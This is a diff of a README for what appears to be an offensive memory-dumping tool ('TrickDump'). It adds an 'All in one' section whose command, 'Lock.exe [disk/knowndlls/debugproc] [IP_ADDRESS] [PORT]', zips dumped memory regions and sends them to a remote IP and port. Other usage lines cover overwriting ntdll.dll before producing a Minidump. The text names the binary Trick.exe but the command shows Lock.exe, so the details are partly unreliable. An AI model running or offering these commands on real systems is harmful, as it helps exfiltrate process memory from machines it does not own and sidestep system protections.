@@ -60,7 +60,6 @@ Shock.exe [disk/knowndlls/debugproc]
 ```
 Barrel.exe [disk/knowndlls/debugproc]
 ```
-
 You can execute the programs directly without overwriting the ntdll.dll library:
 
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_1.png)
@@ -72,3 +71,20 @@ Or use one of the three different overwrite techniques:
 Then the Minidump file is generated:
 
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_3.png)
+
+-------------------------
+
+## All in one
+
+If you prefer to execute only one binary, Trick.exe generates a ZIP file containing the 3 JSON files and the ZIP file with the memory regions:
+
+```
+Lock.exe [disk/knowndlls/debugproc] [IP_ADDRESS] [PORT]
+```
+You can create the ZIP file locally, optionally using a Ntdll overwrite method:
+
+![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_5.png)
+
+Or send it to a remote port using the second and third parameter as the IP address and the port:
+
+![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/trickdump/Screenshot_6.png)
